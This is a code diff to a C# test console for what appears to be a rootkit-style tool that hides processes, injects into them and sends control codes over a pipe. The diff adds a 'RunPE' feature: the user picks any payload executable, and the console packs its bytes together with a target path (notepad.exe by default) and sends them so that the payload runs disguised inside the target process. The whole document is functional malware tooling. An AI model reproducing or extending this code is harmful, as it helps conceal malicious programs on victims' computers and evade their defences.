@@ -29,6 +29,7 @@ namespace TestConsole
 		private DelegateCommand<ProcessView> _UnhideCommand;
 		private DelegateCommand _InjectAllCommand;
 		private DelegateCommand _DetachAllCommand;
+		private DelegateCommand _ControlCodeRunPEPayloadPathBrowseCommand;
 		private DelegateCommand<ControlCode> _ControlCommand;
 		private DelegateCommand<string> _HelpCommand;
 		public DelegateCommand ElevateCommand => _ElevateCommand ?? (_ElevateCommand = new DelegateCommand(ElevateCommand_Execute, ElevateCommand_CanExecute));
@@ -39,6 +40,7 @@ namespace TestConsole
 		public DelegateCommand<ProcessView> UnhideCommand => _UnhideCommand ?? (_UnhideCommand = new DelegateCommand<ProcessView>(UnhideCommand_Execute));
 		public DelegateCommand InjectAllCommand => _InjectAllCommand ?? (_InjectAllCommand = new DelegateCommand(InjectAllCommand_Execute));
 		public DelegateCommand DetachAllCommand => _DetachAllCommand ?? (_DetachAllCommand = new DelegateCommand(DetachAllCommand_Execute));
+		public DelegateCommand ControlCodeRunPEPayloadPathBrowseCommand => _ControlCodeRunPEPayloadPathBrowseCommand ?? (_ControlCodeRunPEPayloadPathBrowseCommand = new DelegateCommand(ControlCodeRunPEPayloadPathBrowseCommand_Execute));
 		public DelegateCommand<ControlCode> ControlCommand => _ControlCommand ?? (_ControlCommand = new DelegateCommand<ControlCode>(ControlCommand_Execute));
 		public DelegateCommand<string> HelpCommand => _HelpCommand ?? (_HelpCommand = new DelegateCommand<string>(HelpCommand_Execute));
 
@@ -51,6 +53,8 @@ namespace TestConsole
 		private string _ControlCodeDetachProcessId;
 		private string _ControlCodeShellExecPath;
 		private string _ControlCodeShellExecCommandLine;
+		private string _ControlCodeRunPETargetPath;
+		private string _ControlCodeRunPEPayloadPath;
 		public bool IsInitialized
 		{
 			get => _IsInitialized;
@@ -96,6 +100,16 @@ namespace TestConsole
 			get => _ControlCodeShellExecCommandLine;
 			set => Set(ref _ControlCodeShellExecCommandLine, value);
 		}
+		public string ControlCodeRunPETargetPath
+		{
+			get => _ControlCodeRunPETargetPath;
+			set => Set(ref _ControlCodeRunPETargetPath, value);
+		}
+		public string ControlCodeRunPEPayloadPath
+		{
+			get => _ControlCodeRunPEPayloadPath;
+			set => Set(ref _ControlCodeRunPEPayloadPath, value);
+		}
 
 		public MainWindowViewModel(MainWindow view)
 		{
@@ -103,6 +117,7 @@ namespace TestConsole
 			View = view;
 
 			Processes = new ObservableCollection<ProcessView>();
+			ControlCodeRunPETargetPath = @"C:\Windows\System32\notepad.exe";
 		}
 
 		public void OnLoaded()
@@ -228,6 +243,13 @@ namespace TestConsole
 			Log(ProcessList.DetachAll().ToArray());
 			UpdateProcesses();
 		}
+		private void ControlCodeRunPEPayloadPathBrowseCommand_Execute()
+		{
+			if (FileDialogs.Open("exe") is string path)
+			{
+				ControlCodeRunPEPayloadPath = path;
+			}
+		}
 		private void ControlCommand_Execute(ControlCode parameter)
 		{
 			try
@@ -332,6 +354,64 @@ namespace TestConsole
 								}
 
 								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), ControlCodeShellExecPath + (ControlCodeShellExecCommandLine == null ? null : " " + ControlCodeShellExecCommandLine)).ToArray());
+							}
+						}
+						break;
+					case ControlCode.UserRunPE:
+						ControlCodeRunPETargetPath = ControlCodeRunPETargetPath?.Trim().ToNullIfEmpty();
+						ControlCodeRunPEPayloadPath = ControlCodeRunPEPayloadPath?.Trim().ToNullIfEmpty();
+
+						if (ControlCodeRunPETargetPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a target path.")
+							));
+						}
+						else if (ControlCodeRunPEPayloadPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a payload.")
+							));
+						}
+						else if (!File.Exists(ControlCodeRunPETargetPath))
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogTextItem("File"),
+								new LogFileItem(Path.GetFileName(ControlCodeRunPETargetPath)),
+								new LogTextItem("not found.")
+							));
+						}
+						else if (!File.Exists(ControlCodeRunPEPayloadPath))
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogTextItem("File"),
+								new LogFileItem(Path.GetFileName(ControlCodeRunPEPayloadPath)),
+								new LogTextItem("not found.")
+							));
+						}
+						else
+						{
+							using (MemoryStream memoryStream = new MemoryStream())
+							{
+								using (BinaryWriter writer = new BinaryWriter(memoryStream))
+								{
+									writer.Write(ControlCodeRunPETargetPath.ToUnicodeBytes());
+									writer.Write((short)0);
+									writer.Write((int)new FileInfo(ControlCodeRunPEPayloadPath).Length);
+									writer.Write(File.ReadAllBytes(ControlCodeRunPEPayloadPath));
+								}
+
+								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), Path.GetFileName(ControlCodeRunPEPayloadPath) + " -> " + Path.GetFileName(ControlCodeRunPETargetPath)).ToArray());
 							}
 						}
 						break;
